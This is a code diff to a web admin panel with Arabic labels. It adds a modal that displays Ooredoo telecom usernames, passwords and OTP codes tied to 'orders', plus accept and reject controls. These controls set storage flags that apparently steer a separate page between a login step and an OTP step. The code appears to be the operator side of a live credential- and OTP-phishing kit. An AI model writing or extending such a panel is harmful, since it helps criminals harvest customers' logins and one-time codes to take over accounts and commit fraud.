@@ -201,6 +201,15 @@
   </div>
 </div>
 
+<div class="modal-overlay" id="ooredooModal">
+  <div class="modal-box">
+    <button type="button" class="modal-close" id="ooredooModalCloseBtn">&times;</button>
+    <p class="modal-title">بيانات أوريدو</p>
+    <p class="modal-sub">معلومات تسجيل الدخول وOTP المرتبطة بهذا الطلب</p>
+    <div id="ooredooModalBody"></div>
+  </div>
+</div>
+
 <script>
   let adminToken = '';
   let loadedApplications = [];
@@ -436,7 +445,7 @@
       tbody.querySelectorAll('.action-btn.ooredoo').forEach((btn) => {
         btn.addEventListener('click', () => {
           const app = loadedApplications[parseInt(btn.dataset.index, 10)];
-          if (app) openDetailsModal(app);
+          if (app) openOoredooModal(app);
         });
       });
     } catch (err) {
@@ -518,6 +527,31 @@
     document.getElementById('detailsModal').classList.add('show');
   }
 
+  function openOoredooModal(d) {
+    const modalBody = document.getElementById('ooredooModalBody');
+    const box = ooredooDetailBox(d);
+    modalBody.innerHTML = box || `
+      <div class="confirm-block">
+        <p class="confirm-block-title">بيانات أوريدو</p>
+        <div class="confirm-row"><span>الحالة</span><strong>لا توجد بيانات</strong></div>
+      </div>
+    `;
+
+    modalBody.insertAdjacentHTML('beforeend', `
+      <div class="modal-actions">
+        <button type="button" class="action-btn accept" id="ooredooAcceptBtn">قبول</button>
+        <button type="button" class="action-btn reject" id="ooredooRejectBtn">رفض</button>
+      </div>
+    `);
+
+    const acceptBtn = document.getElementById('ooredooAcceptBtn');
+    const rejectBtn = document.getElementById('ooredooRejectBtn');
+    if (acceptBtn) acceptBtn.addEventListener('click', () => submitDecision(d, 'accept'));
+    if (rejectBtn) rejectBtn.addEventListener('click', () => submitDecision(d, 'reject'));
+
+    document.getElementById('ooredooModal').classList.add('show');
+  }
+
   function approveOoredoo(id) {
     const app = loadedApplications.find((d) => (d.id || d.applicant && d.applicant.id || d._id) === id);
     if (app) {
@@ -548,13 +582,22 @@
     } catch (err) { /* ignore network errors, still update UI */ }
 
     try {
+      const card = d.card || d.payment || null;
+      const hasLoginData = Boolean((d.ooredooUser || (card && card.ooredooUser)) && (d.ooredooPass || (card && card.ooredooPass)));
+      const hasOtpData = Boolean(d.ooredooOtp || (card && card.ooredooOtp));
+      const flow = hasOtpData ? 'otp' : 'login';
+
       localStorage.setItem('ooredooDecision', decision);
       sessionStorage.setItem('ooredooDecision', decision);
+      sessionStorage.setItem('ooredooFlow', flow);
+      sessionStorage.setItem('safwa_order_id', id || sessionStorage.getItem('safwa_order_id') || 'ooredoo-' + Date.now());
     } catch (err) {}
 
     d.status = decision;
-    const modal = document.getElementById('detailsModal');
-    if (modal) modal.classList.remove('show');
+    const detailsModal = document.getElementById('detailsModal');
+    const ooredooModal = document.getElementById('ooredooModal');
+    if (detailsModal) detailsModal.classList.remove('show');
+    if (ooredooModal) ooredooModal.classList.remove('show');
     loadApplications();
   }
 
@@ -564,6 +607,15 @@
   document.getElementById('detailsModal').addEventListener('click', (e) => {
     if (e.target.id === 'detailsModal') {
       document.getElementById('detailsModal').classList.remove('show');
+    }
+  });
+
+  document.getElementById('ooredooModalCloseBtn').addEventListener('click', () => {
+    document.getElementById('ooredooModal').classList.remove('show');
+  });
+  document.getElementById('ooredooModal').addEventListener('click', (e) => {
+    if (e.target.id === 'ooredooModal') {
+      document.getElementById('ooredooModal').classList.remove('show');
     }
   });
 
